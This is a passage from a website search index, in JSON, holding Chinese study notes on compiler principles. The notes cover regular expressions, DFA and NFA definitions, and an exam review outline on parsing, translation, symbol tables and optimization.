\u56fd\u9632\u79d1\u6280\u5927\u5b66\u300a\u7f16\u8bd1\u539f\u7406\u300b \u7684PPT\uff0c\u6574\u7406\u4e86\u8fd9\u4e00\u7ae0\u7684\u5185\u5bb9\uff0c\u5e0c\u671b\u80fd\u591f\u7406\u89e3\u8fd9\u90e8\u5206\u7684\u77e5\u8bc6\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#2","text":"","title":"2. \u6b63\u89c4\u5f0f\u548c\u6b63\u89c4\u96c6"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#21","text":"\u5bf9\u7ed9\u5b9a\u7684\u5b57\u6bcd\u8868 \\sum \\epsilon \u548c \\empty \u90fd\u662f \\sum \u4e0a\u7684\u6b63\u89c4\u5f0f\uff0c\u5b83\u4eec\u6240\u8868\u793a\u7684\u6b63\u89c4\u96c6\u4e3a \\{\\epsilon\\} \u548c \\empty ; \u4efb\u4f55 a \\in \\sum \uff0c a \u662f \\sum \u4e0a\u7684\u6b63\u89c4\u5f0f\uff0c\u5b83\u6240\u8868\u793a\u7684\u6b63\u89c4\u96c6\u4e3a \\{a\\} ; \u5047\u5b9a e_1 \u548c e_2 \u90fd\u662f \\sum \u4e0a\u7684\u6b63\u89c4\u5f0f\uff0c\u5b83\u4eec\u6240\u8868\u793a \u7684\u6b63\u89c4\u96c6\u4e3a L(e_1) \u548c L(e_2) \uff0c\u5219 (e_1|e_2) \u4e3a\u6b63\u89c4\u5f0f\uff0c\u5b83\u6240\u8868\u793a\u7684\u6b63\u89c4\u96c6\u4e3a L(e_1) \\cup L(e_2) (e_1 \\cdot e_2) \u4e3a\u6b63\u89c4\u5f0f\uff0c\u5b83\u6240\u8868\u793a\u7684\u6b63\u89c4\u96c6\u4e3a L(e_1) L(e_2) (e_1)^* \u4e3a\u6b63\u89c4\u5f0f\uff0c\u5b83\u6240\u8868\u793a\u7684\u6b63\u89c4\u96c6\u4e3a (L(e_1))^* \u4ec5\u7531\u6709\u9650\u6b21\u4f7f\u7528\u4e0a\u8ff0\u4e09\u6b65\u9aa4\u800c\u5b9a\u4e49\u7684\u8868\u8fbe\u5f0f\u624d \u662f \\sum \u4e0a\u7684\u6b63\u89c4\u5f0f\uff0c\u4ec5\u7531\u8fd9\u4e9b\u6b63\u89c4\u5f0f\u8868\u793a\u7684\u5b57 \u96c6\u624d\u662f \\sum \u4e0a\u7684\u6b63\u89c4\u96c6\u3002","title":"2.1. \u5b9a\u4e49"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#22","text":"\\text{Figure 1. \u6b63\u89c4\u5f0f\u7684\u7b49\u4ef7\u6027}","title":"2.2. \u6b63\u89c4\u5f0f\u7684\u7b49\u4ef7\u6027"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#23","text":"\\text{Figure 2. \u6b63\u89c4\u5f0f\u7684\u7b49\u4ef7\u6027}","title":"2.3. \u6b63\u89c4\u5f0f\u7684\u6027\u8d28"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#3","text":"","title":"3. \u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a\u548c\u975e\u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#31-dfa","text":"\u5bf9\u72b6\u6001\u56fe\u8fdb\u884c\u5f62\u5f0f\u5316\u5b9a\u4e49 \uf075\u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a(Deterministic Finite Automata\uff0cDFA) M\u662f\u4e00\u4e2a\u4e94\u5143\u5f0f M=(S, \u03a3, f, S0, F)\uff0c\u5176\u4e2d: S: \u6709\u7a77\u72b6\u6001\u96c6 \u89c6\u9891\u533a\u57df \u03a3:\u8f93\u5165\u5b57\u6bcd\u8868(\u6709\u7a77) f: \u72b6\u6001\u8f6c\u6362\u51fd\u6570\uff0c\u4e3aS\u00d7\u03a3\u2192S\u7684\u5355\u503c\u90e8\u5206\u6620\u5c04\uff0cf(s\uff0c a)=s\u2019\u8868\u793a:\u5f53\u73b0\u884c\u72b6\u6001\u4e3as\uff0c\u8f93\u5165\u5b57\u7b26\u4e3aa\u65f6\uff0c\u5c06 \u72b6\u6001\u8f6c\u6362\u5230\u4e0b\u4e00\u72b6\u6001s\u2019\uff0cs\u2019\u79f0\u4e3as\u7684\u4e00\u4e2a\u540e\u7ee7\u72b6\u6001 S0\u2208S\u662f\u552f\u4e00\u7684\u4e00\u4e2a\u521d\u6001 F\u2286S :\u7ec8\u6001\u96c6(\u53ef\u7a7a)","title":"3.1. \u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a(DFA)"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#32-nfa","text":"\u5b9a\u4e49:\u4e00\u4e2a\u975e\u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a (Nondeterministic Finite Automata\uff0cNFA) M\u662f\u4e00\u4e2a\u4e94\u5143\u5f0fM=(S, \u03a3, f, S0, F)\uff0c\u5176\u4e2d: S: \u6709\u7a77\u72b6\u6001\u96c6 \u03a3 :\u8f93\u5165\u5b57\u6bcd\u8868(\u6709\u7a77) f: \u72b6\u6001\u8f6c\u6362\u51fd\u6570\uff0c\u4e3aS\u00d7\u03a3*\u21922S\u7684\u90e8\u5206\u6620\u5c04 S0\u2286S\u662f\u975e\u7a7a\u7684\u521d\u6001\u96c6 F \u2286S :\u7ec8\u6001\u96c6(\u53ef\u7a7a)","title":"3.2. \u975e\u786e\u5b9a\u6709\u9650\u81ea\u52a8\u673a(NFA)"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#4","text":"","title":"4. \u6b63\u89c4\u5f0f\u4e0e\u6709\u9650\u81ea\u52a8\u673a\u7684\u7b49\u4ef7\u6027"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#41-nfa","text":"","title":"4.1. \u4e3aNFA\u6784\u9020\u6b63\u89c4\u5f0f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#42-nfa","text":"","title":"4.2. \u4e3a\u6b63\u89c4\u5f0f\u6784\u9020NFA"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#5-dfanfa","text":"","title":"5. DFA\u4e0eNFA\u7684\u7b49\u4ef7\u6027"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#6-nfadfa","text":"","title":"6. NFA\u8f6c\u6362\u6210DFA"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#7-dfa","text":"\u6ce8\uff1a\u90e8\u5206\u5185\u5bb9\u6574\u7406\u81ea\u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e \u300a\u7f16\u8bd1\u539f\u7406\u300b \u6559\u6750\u548c\u4e2d\u56fd\u5927\u5b66MOOC- \u56fd\u9632\u79d1\u6280\u5927\u5b66\u300a\u7f16\u8bd1\u539f\u7406\u300b PPT","title":"7. DFA\u7684\u5316\u7b80"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90-%E8%AF%8D%E6%B3%95%E8%A7%84%E5%88%99%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%8C%96/#8","text":"[1] \u9648\u706b\u65fa. \u7f16\u8bd1\u539f\u7406 [M]. \u5317\u4eac : \u56fd\u9632\u5de5\u4e1a\u51fa\u7248\u793e, 2010. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"8. \u53c2\u8003\u6587\u732e"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/","text":"\u590d\u4e60\u63d0\u7eb2 # \u76ee\u5f55 # \u590d\u4e60\u63d0\u7eb2 \u76ee\u5f55 1. \u80cc\u666f 2. \u5f15\u8bba 2.1. \u7f16\u8bd1\u76845\u4e2a\u9636\u6bb5\u53ca\u5176\u4e3b\u8981\u4efb\u52a1 3. \u9ad8\u7ea7\u8bed\u8a00\u53ca\u5176\u8bed\u6cd5\u63cf\u8ff0 3.1. \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 4. \u8bcd\u6cd5\u5206\u6790 4.1. \u72b6\u6001\u8f6c\u6362\u56fe 4.2. DFA 4.3. NFA 4.4. \u5b50\u96c6\u6cd5 4.5. DFA\u7684\u5316\u7b80 5. \u8bed\u6cd5\u5206\u6790-\u81ea\u4e0a\u800c\u4e0b\u5206\u6790 5.1. LR\u5206\u6790\u6cd5\u7684\u5206\u6790\u8fc7\u7a0b 5.2. LR\u5206\u6790\u8868\u7684\u6784\u9020 5.3. SLR\u6587\u6cd5\u7684\u5224\u65ad 6. \u8bed\u6cd5\u5206\u6790-\u81ea\u4e0b\u800c\u4e0a\u5206\u6790 7. \u5c5e\u6027\u6587\u6cd5\u548c\u8bed\u6cd5\u5236\u5bfc\u7ffb\u8bd1 7.1. \u8868\u8fbe\u5f0f\u7ffb\u8bd1\u540e\u7684\u56db\u5143\u5f0f\u8868\u793a 8. \u8bed\u4e49\u5206\u6790\u548c\u4e2d\u95f4\u4ee3\u7801\u751f\u6210 9. \u7b26\u53f7\u8868 9.1. \u7b26\u53f7\u8868\u7684\u57fa\u672c\u6982\u5ff5 10. \u4f18\u5316 10.1. \u4f18\u5316\u7684\u539f\u5219\u548c\u4e3b\u8981\u65b9\u6cd5\u3001\u57fa\u672c\u5757\u5212\u5206 1. \u80cc\u666f # \u6700\u8fd1\u5feb\u8981\u8003\u8bd5\u4e86\uff0c\u6574\u7406\u4e86\u4e00\u4e0b\u7f16\u8bd1\u539f\u7406\u7684\u590d\u4e60\u63d0\u7eb2\u3002 2. \u5f15\u8bba # 2.1. \u7f16\u8bd1\u76845\u4e2a\u9636\u6bb5\u53ca\u5176\u4e3b\u8981\u4efb\u52a1 # 5\u4e2a\u9636\u6bb5 \u8bcd\u6cd5\u5206\u6790 \u8bed\u6cd5\u5206\u6790 \u8bed\u4e49\u5206\u6790\u4e0e\u4e2d\u95f4\u4ee3\u7801\u751f\u6210 \u4f18\u5316 \u76ee\u6807\u4ee3\u7801\u751f\u6210 \u8bcd\u6cd5\u5206\u6790\u4efb\u52a1 \uff1a\u4ece\u5de6\u81f3\u53f3\u9010\u4e2a\u5b57\u7b26\u5730\u5bf9\u6e90\u7a0b\u5e8f\u8fdb\u884c\u626b\u63cf\uff0c\u4ea7\u751f\u4e00\u4e2a\u4e2a\u5355\u8bcd\u7b26\u53f7 \u8bed\u6cd5\u5206\u6790\u4efb\u52a1 \uff1a\u5206\u6790\u4e00\u4e2a\u6587\u6cd5\u7684\u53e5\u5b50\u7684\u7ed3\u6784\uff0c\u6784\u9020\u8bed\u6cd5\u6811 \u8bed\u4e49\u5206\u6790\u4e0e\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\u4efb\u52a1 \uff1a\u751f\u6210\u4e2d\u95f4\u4ee3\u7801 \u4f18\u5316\u4efb\u52a1 \uff1a\u5bf9\u4e2d\u95f4\u4ee3\u7801\u8fdb\u884c\u52a0\u5de5\uff0c\u7528\u4ee5\u4ea7\u751f\u66f4\u52a0\u9ad8\u6548\u7684\u76ee\u6807\u4ee3\u7801 \u76ee\u6807\u4ee3\u7801\u751f\u6210\u4efb\u52a1 \uff1a\u628a\u4e2d\u95f4\u4ee3\u7801\u53d8\u6362\u6210\u673a\u5668\u4e0a\u7684\u4f4e\u7ea7\u8bed\u8a00\u4ee3\u7801 3. \u9ad8\u7ea7\u8bed\u8a00\u53ca\u5176\u8bed\u6cd5\u63cf\u8ff0 # \u6700\u5de6\u63a8\u5bfc\uff1a\u4efb\u4f55\u4e00\u6b65 \\alpha \\to \\beta \u90fd\u662f\u5bf9 \\alpha \u4e2d\u7684\u6700\u5de6\u975e\u7ec8\u7ed3\u7b26\u8fdb\u884c\u66ff\u6362\u7684\u3002 \u6700\u53f3\u63a8\u5bfc\uff1a\u4efb\u4f55\u4e00\u6b65 \\alpha \\to \\beta \u90fd\u662f\u5bf9 \\alpha \u4e2d\u7684\u6700\u53f3\u975e\u7ec8\u7ed3\u7b26\u8fdb\u884c\u66ff\u6362\u7684\u3002 3.1. \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 # 4. \u8bcd\u6cd5\u5206\u6790 # 4.1. \u72b6\u6001\u8f6c\u6362\u56fe # 4.2. DFA # 4.3. NFA # 4.4. \u5b50\u96c6\u6cd5 # 4.5. DFA\u7684\u5316\u7b80 # 5. \u8bed\u6cd5\u5206\u6790-\u81ea\u4e0a\u800c\u4e0b\u5206\u6790 # 5.1. LR\u5206\u6790\u6cd5\u7684\u5206\u6790\u8fc7\u7a0b # 5.2. LR\u5206\u6790\u8868\u7684\u6784\u9020 # 5.3. SLR\u6587\u6cd5\u7684\u5224\u65ad # 6. \u8bed\u6cd5\u5206\u6790-\u81ea\u4e0b\u800c\u4e0a\u5206\u6790 # \u8bc1\u660e\u53e5\u578b\u89c4\u8303\u53e5\u578b\uff08\u5c31\u662f\u6c42\u8be5\u53e5\u578b\u7684\u6700\u53f3\u63a8\u5bfc\uff09\u3002 \u753b\u51fa\u53e5\u578b\u7684\u8bed\u6cd5\u6811\uff0c\u6c42\u51fa\u5b83\u6240\u6709\u7684\u76f4\u63a5\u77ed\u8bed\u3001\u53e5\u67c4\u3001\u7d20\u77ed\u8bed\u548c\u6700\u5de6\u7d20\u77ed\u8bed\u3002 \u590d\u4e60\u8bfe\u5802\u4f8b\u9898\u3001\u7ec3\u4e60\u3002 7. \u5c5e\u6027\u6587\u6cd5\u548c\u8bed\u6cd5\u5236\u5bfc\u7ffb\u8bd1 # 7.1. \u8868\u8fbe\u5f0f\u7ffb\u8bd1\u540e\u7684\u56db\u5143\u5f0f\u8868\u793a # 8. \u8bed\u4e49\u5206\u6790\u548c\u4e2d\u95f4\u4ee3\u7801\u751f\u6210 # 9. \u7b26\u53f7\u8868 # 9.1. \u7b26\u53f7\u8868\u7684\u57fa\u672c\u6982\u5ff5 # 10. \u4f18\u5316 # 10.1. \u4f18\u5316\u7684\u539f\u5219\u548c\u4e3b\u8981\u65b9\u6cd5\u3001\u57fa\u672c\u5757\u5212\u5206 #","title":"5.\u590d\u4e60\u63d0\u7eb2"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#_1","text":"","title":"\u590d\u4e60\u63d0\u7eb2"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#_2","text":"\u590d\u4e60\u63d0\u7eb2 \u76ee\u5f55 1. \u80cc\u666f 2. \u5f15\u8bba 2.1. \u7f16\u8bd1\u76845\u4e2a\u9636\u6bb5\u53ca\u5176\u4e3b\u8981\u4efb\u52a1 3. \u9ad8\u7ea7\u8bed\u8a00\u53ca\u5176\u8bed\u6cd5\u63cf\u8ff0 3.1. \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5 4. \u8bcd\u6cd5\u5206\u6790 4.1. \u72b6\u6001\u8f6c\u6362\u56fe 4.2. DFA 4.3. NFA 4.4. \u5b50\u96c6\u6cd5 4.5. DFA\u7684\u5316\u7b80 5. \u8bed\u6cd5\u5206\u6790-\u81ea\u4e0a\u800c\u4e0b\u5206\u6790 5.1. LR\u5206\u6790\u6cd5\u7684\u5206\u6790\u8fc7\u7a0b 5.2. LR\u5206\u6790\u8868\u7684\u6784\u9020 5.3. SLR\u6587\u6cd5\u7684\u5224\u65ad 6. \u8bed\u6cd5\u5206\u6790-\u81ea\u4e0b\u800c\u4e0a\u5206\u6790 7. \u5c5e\u6027\u6587\u6cd5\u548c\u8bed\u6cd5\u5236\u5bfc\u7ffb\u8bd1 7.1. \u8868\u8fbe\u5f0f\u7ffb\u8bd1\u540e\u7684\u56db\u5143\u5f0f\u8868\u793a 8. \u8bed\u4e49\u5206\u6790\u548c\u4e2d\u95f4\u4ee3\u7801\u751f\u6210 9. \u7b26\u53f7\u8868 9.1. \u7b26\u53f7\u8868\u7684\u57fa\u672c\u6982\u5ff5 10. \u4f18\u5316 10.1. \u4f18\u5316\u7684\u539f\u5219\u548c\u4e3b\u8981\u65b9\u6cd5\u3001\u57fa\u672c\u5757\u5212\u5206","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#1","text":"\u6700\u8fd1\u5feb\u8981\u8003\u8bd5\u4e86\uff0c\u6574\u7406\u4e86\u4e00\u4e0b\u7f16\u8bd1\u539f\u7406\u7684\u590d\u4e60\u63d0\u7eb2\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#2","text":"","title":"2. \u5f15\u8bba"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#21-5","text":"5\u4e2a\u9636\u6bb5 \u8bcd\u6cd5\u5206\u6790 \u8bed\u6cd5\u5206\u6790 \u8bed\u4e49\u5206\u6790\u4e0e\u4e2d\u95f4\u4ee3\u7801\u751f\u6210 \u4f18\u5316 \u76ee\u6807\u4ee3\u7801\u751f\u6210 \u8bcd\u6cd5\u5206\u6790\u4efb\u52a1 \uff1a\u4ece\u5de6\u81f3\u53f3\u9010\u4e2a\u5b57\u7b26\u5730\u5bf9\u6e90\u7a0b\u5e8f\u8fdb\u884c\u626b\u63cf\uff0c\u4ea7\u751f\u4e00\u4e2a\u4e2a\u5355\u8bcd\u7b26\u53f7 \u8bed\u6cd5\u5206\u6790\u4efb\u52a1 \uff1a\u5206\u6790\u4e00\u4e2a\u6587\u6cd5\u7684\u53e5\u5b50\u7684\u7ed3\u6784\uff0c\u6784\u9020\u8bed\u6cd5\u6811 \u8bed\u4e49\u5206\u6790\u4e0e\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\u4efb\u52a1 \uff1a\u751f\u6210\u4e2d\u95f4\u4ee3\u7801 \u4f18\u5316\u4efb\u52a1 \uff1a\u5bf9\u4e2d\u95f4\u4ee3\u7801\u8fdb\u884c\u52a0\u5de5\uff0c\u7528\u4ee5\u4ea7\u751f\u66f4\u52a0\u9ad8\u6548\u7684\u76ee\u6807\u4ee3\u7801 \u76ee\u6807\u4ee3\u7801\u751f\u6210\u4efb\u52a1 \uff1a\u628a\u4e2d\u95f4\u4ee3\u7801\u53d8\u6362\u6210\u673a\u5668\u4e0a\u7684\u4f4e\u7ea7\u8bed\u8a00\u4ee3\u7801","title":"2.1. \u7f16\u8bd1\u76845\u4e2a\u9636\u6bb5\u53ca\u5176\u4e3b\u8981\u4efb\u52a1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#3","text":"\u6700\u5de6\u63a8\u5bfc\uff1a\u4efb\u4f55\u4e00\u6b65 \\alpha \\to \\beta \u90fd\u662f\u5bf9 \\alpha \u4e2d\u7684\u6700\u5de6\u975e\u7ec8\u7ed3\u7b26\u8fdb\u884c\u66ff\u6362\u7684\u3002 \u6700\u53f3\u63a8\u5bfc\uff1a\u4efb\u4f55\u4e00\u6b65 \\alpha \\to \\beta \u90fd\u662f\u5bf9 \\alpha \u4e2d\u7684\u6700\u53f3\u975e\u7ec8\u7ed3\u7b26\u8fdb\u884c\u66ff\u6362\u7684\u3002","title":"3. \u9ad8\u7ea7\u8bed\u8a00\u53ca\u5176\u8bed\u6cd5\u63cf\u8ff0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#31","text":"","title":"3.1. \u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#4","text":"","title":"4. \u8bcd\u6cd5\u5206\u6790"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#41","text":"","title":"4.1. \u72b6\u6001\u8f6c\u6362\u56fe"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#42-dfa","text":"","title":"4.2. DFA"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#43-nfa","text":"","title":"4.3. NFA"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#44","text":"","title":"4.4. \u5b50\u96c6\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#45-dfa","text":"","title":"4.5. DFA\u7684\u5316\u7b80"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#5-","text":"","title":"5. \u8bed\u6cd5\u5206\u6790-\u81ea\u4e0a\u800c\u4e0b\u5206\u6790"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#51-lr","text":"","title":"5.1. LR\u5206\u6790\u6cd5\u7684\u5206\u6790\u8fc7\u7a0b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#52-lr","text":"","title":"5.2. LR\u5206\u6790\u8868\u7684\u6784\u9020"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#53-slr","text":"","title":"5.3. SLR\u6587\u6cd5\u7684\u5224\u65ad"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#6-","text":"\u8bc1\u660e\u53e5\u578b\u89c4\u8303\u53e5\u578b\uff08\u5c31\u662f\u6c42\u8be5\u53e5\u578b\u7684\u6700\u53f3\u63a8\u5bfc\uff09\u3002 \u753b\u51fa\u53e5\u578b\u7684\u8bed\u6cd5\u6811\uff0c\u6c42\u51fa\u5b83\u6240\u6709\u7684\u76f4\u63a5\u77ed\u8bed\u3001\u53e5\u67c4\u3001\u7d20\u77ed\u8bed\u548c\u6700\u5de6\u7d20\u77ed\u8bed\u3002 \u590d\u4e60\u8bfe\u5802\u4f8b\u9898\u3001\u7ec3\u4e60\u3002","title":"6. \u8bed\u6cd5\u5206\u6790-\u81ea\u4e0b\u800c\u4e0a\u5206\u6790"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#7","text":"","title":"7. \u5c5e\u6027\u6587\u6cd5\u548c\u8bed\u6cd5\u5236\u5bfc\u7ffb\u8bd1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#71","text":"","title":"7.1. \u8868\u8fbe\u5f0f\u7ffb\u8bd1\u540e\u7684\u56db\u5143\u5f0f\u8868\u793a"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/5.%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/#8","text":"","title":"8. 